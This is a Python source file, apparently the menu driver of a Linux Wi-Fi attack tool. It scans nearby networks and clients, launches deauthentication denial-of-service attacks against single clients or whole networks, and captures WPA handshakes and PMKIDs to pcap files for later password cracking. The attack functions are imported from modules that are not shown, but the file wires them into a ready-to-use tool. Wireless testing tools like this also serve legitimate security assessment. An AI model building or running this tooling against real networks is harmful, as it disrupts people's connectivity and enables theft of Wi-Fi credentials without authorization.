## THIS PROGRAM ONLY WORKS ON LINUX
##
## SYSTEM DEPENDENCIES:
## sudo apt install iw
## sudo apt install libpcap-dev

import os
import sys
import questionary

from prompt_toolkit.styles import Style
from scapy.config import conf
from scapy.all import RandMAC

from constants import DEAUTH_PACKET_COUNT
from utils import ensure_root, load_dotenv
from scanner import run_network_scanner, run_client_scanner
from monitor_mode import monitor_mode
from capture import capture_handshakes, capture_pmkid
from deauth import send_deauth_to_client, send_deauth_to_all
from pmkid import trigger_pmkid

ENTER_BACK_TEXT = '\n[Press ENTER to go back...]'

NETWORK_SCAN_ACTION = 'Scan Networks'
CLIENT_SCAN_ACTION = 'Scan Clients'

NETWORK_DEAUTH_ATTACK_ACTION = 'Network DoS Attack'
CLIENT_DEAUTH_ATTACK_ACTION = 'Client DoS Attack'

NETWORK_DEAUTH_HANDSHAKE_CAPTURE = 'Network Deauth & Handshake'
CLIENT_DEAUTH_HANDSHAKE_CAPTURE = 'Client Deauth & Handshake'
NETWORK_PMKID_CAPTURE = 'Capture Network PMKID'

BACK_ACTION = 'Back'
EXIT_ACTION = 'Exit'

custom_style = Style([
    ('question', 'bold'),
    ('answer', 'fg:white'),
    ('pointer', 'bold'),
    ('highlighted', 'bold'),
])

def clear_screen():
    os.system('clear')

def print_banner(text):
    chars = len(text)
    pad = 10

    print((2 * pad + chars) * '=')
    print(pad * ' ' + text + pad * ' ')
    print((2 * pad + chars) * '=')
    print()

def unpack_client(c):
    return c['mac'], c['pwr'], c['ssid'], c['bssid'], c['channel'], c['crypto']

def unpack_network(n):
    return n['bssid'], n['ssid'], n['pwr'], n['channel'], n['crypto']

def run_selection(text, choices):
    return questionary.select(
        text,
        choices=choices,
        qmark='',
        pointer='->',
        style=custom_style
    ).ask()


session_networks = []
session_clients = []

def handle_network_scan_menu(interface):
    global session_networks
    clear_screen()

    input(f'[Press ENTER to start scanning...]\n')
    clear_screen()

    new_networks = run_network_scanner(interface)
    session_networks.extend(new_networks)
    print(f'\nScan complete. Saved {len(session_networks)} networks to memory.')
    input(ENTER_BACK_TEXT)


# TODO: currently only "passive" client scanning, implement deauthing all and listening for handshakes
def handle_client_scan_menu(interface):
    global session_clients
    clear_screen()

    target = handle_network_select_menu()
    if not target:
        return
    
    input(f'[Press ENTER to start scanning...]\n')
    clear_screen()

    bssid, ssid, _pwr, channel, _crypto = unpack_network(target)
    new_clients = run_client_scanner(interface, bssid, channel)
    session_clients.extend(new_clients)

    print(f'\nScan complete. Added {len(new_clients)} clients to memory.')
    input(ENTER_BACK_TEXT)
    

def handle_client_select_menu():
    global session_clients    
    clear_screen()

    if not session_clients:
        print('Run a client scan. No clients were discovered.')
        input(ENTER_BACK_TEXT)
        return None
    
    # selection header
    header = f"{'CLIENT MAC':<17} | {'PWR':<4} | {'SSID':<22} | {'BSSID':<17} | {'CH':<3} | {'CRYPTO':<8}"
    choices = [
        questionary.Separator(f'{header}'),
        questionary.Separator('-' * 81)
    ]

    # selection options
    for client in session_clients:
        mac, pwr, ssid, bssid, channel, crypto = unpack_client(client)
        row_title = f'{mac:<17} | {pwr:<4} | {ssid[:22]:<22} | {bssid:<17} | {channel:<3} | {crypto:<8}'        
        choices.append(questionary.Choice(title=row_title, value=client))

    # selection footer
    choices.append(questionary.Separator('-' * 81))
    choices.append(BACK_ACTION)

    choice = run_selection('Select target client:', choices)

    if choice == BACK_ACTION or choice is None:
        return None

    return choice


def handle_network_select_menu():
    global session_networks    
    clear_screen()

    if not session_networks:
        print('Run a network scan. No networks were discovered.')
        input(ENTER_BACK_TEXT)
        return None
    
    # selection header
    header = f"{'SSID':<22} | {'BSSID':<17} | {'ENCRYPTION':<10} | {'CH':<3} | {'PWR':<4}"
    choices = [
        questionary.Separator(f'{header}'),
        questionary.Separator('-' * 81)
    ]

    # selection options
    for network in session_networks:
        bssid, ssid, pwr, channel, crypto = unpack_network(network)
        row_title = f'{ssid[:22]:<22} | {bssid:<17} | {crypto:<10} | {channel:<3} | {pwr:<4}'        
        choices.append(questionary.Choice(title=row_title, value=network))

    # selection footer
    choices.append(questionary.Separator('-' * 81))
    choices.append(BACK_ACTION)

    choice = run_selection('Select target network:', choices)

    if choice == BACK_ACTION or choice is None:
        return None

    return choice


# TODO: add option to set DoS to one-time, or continous (timeout)
def handle_client_deauth_menu(interface):
    target = handle_client_select_menu()

    if not target:
        return
    
    client_mac, pwr, ssid, bssid, channel, crypto = unpack_client(target)

    print(f'\nSelected target client {client_mac} on network {ssid}.')
    input(f'\n[Press ENTER to execute DoS...]')

    with monitor_mode(interface) as interface:
        send_deauth_to_client(interface, bssid, client_mac, channel, count=5)

    input(ENTER_BACK_TEXT)


# TODO: add option to set DoS to one-time, or continous (timeout)
def handle_network_deauth_menu(interface):
    target = handle_network_select_menu()

    if not target:
        return
    
    bssid, ssid, pwr, channel, crypto = unpack_network(target)

    print(f'\nSelected target network {ssid}.')
    input(f'\n[Press ENTER to execute DoS...]')

    with monitor_mode(interface) as interface:
        send_deauth_to_all(interface, bssid, channel, count=5)

    input(ENTER_BACK_TEXT)


def network_deauth_handshake_menu(interface):
    input(f'[Not yet impemented. Press ENTER to go back.]')


def client_deauth_handshake_menu(interface):
    target = handle_client_select_menu()
    
    if not target:
        return
    
    client_mac, pwr, ssid, bssid, channel, crypto = unpack_client(target)
    print(f'\nSelected target client {client_mac} on network {ssid}.')
    input(f'\n[Press ENTER to execute deauthentication and capture handshake...]')

    with monitor_mode(interface) as interface:
        with capture_handshakes(interface, bssid, channel, handshake_limit=1, outfile='temp.pcap') as (handshakes, wait_for_finish):
            send_deauth_to_client(interface, bssid, client_mac, channel, count=5)

            wait_for_finish()

    input(ENTER_BACK_TEXT)


def pmkid_capture_menu(interface):
    target = handle_network_select_menu()

    if not target:
        return
    
    bssid, ssid, channel = target['bssid'], target['ssid'], target['channel']
    fake_mac = RandMAC()

    bssid = bssid.lower()
    
    print(f'\nSelected target network {ssid}.')
    input(f'\n[Press ENTER to capture PMKID...]')
    clear_screen()
    save_file = f"pmkid_{ssid.replace(' ', '_')}.pcap"

    with monitor_mode(interface) as interface:
        with capture_pmkid(interface, bssid, fake_mac, channel, outfile=save_file) as (handshakes, wait_for_stop):
            trigger_pmkid(interface, bssid, fake_mac, ssid, channel)
            wait_for_stop()

    input(ENTER_BACK_TEXT)


def main_menu():
    interface = 'wlp193s0'
    # interface = 'wlx00c0cab8b19b'

    while True:
        clear_screen()
        print_banner('MAIN MENU')

        action = questionary.select(
            'Select action:',
            choices=[
                # questionary.Separator('\n--- SCAN ---'),
                NETWORK_SCAN_ACTION,
                CLIENT_SCAN_ACTION,
                # questionary.Separator('\n--- DENIAL OF SERVICE ---'),
                NETWORK_DEAUTH_ATTACK_ACTION,
                CLIENT_DEAUTH_ATTACK_ACTION,
                # questionary.Separator('\n--- HANDSHAKE CAPTURE ---'),
                NETWORK_DEAUTH_HANDSHAKE_CAPTURE,
                CLIENT_DEAUTH_HANDSHAKE_CAPTURE,
                NETWORK_PMKID_CAPTURE,
                questionary.Separator('\n' + '-' * 40),
                EXIT_ACTION
            ],
            qmark='',
            pointer='->', 
            style=custom_style    
        ).ask()

        if action == 'Exit' or action is None:
            clear_screen()
            sys.exit(0)
            
        elif action == NETWORK_SCAN_ACTION:
            handle_network_scan_menu(interface)

        elif action == CLIENT_SCAN_ACTION:
            handle_client_scan_menu(interface)

        elif action == NETWORK_DEAUTH_ATTACK_ACTION:
            handle_network_deauth_menu(interface)
            
        elif action == CLIENT_DEAUTH_ATTACK_ACTION:
            handle_client_deauth_menu(interface)

        elif action == NETWORK_DEAUTH_HANDSHAKE_CAPTURE:
            network_deauth_handshake_menu(interface)

        elif action == CLIENT_DEAUTH_HANDSHAKE_CAPTURE:
            client_deauth_handshake_menu(interface)

        elif action == NETWORK_PMKID_CAPTURE:
            pmkid_capture_menu(interface)


if __name__ == "__main__":
    conf.verb = 0
    conf.use_pcap = True
    ensure_root()
    load_dotenv()
    main_menu()
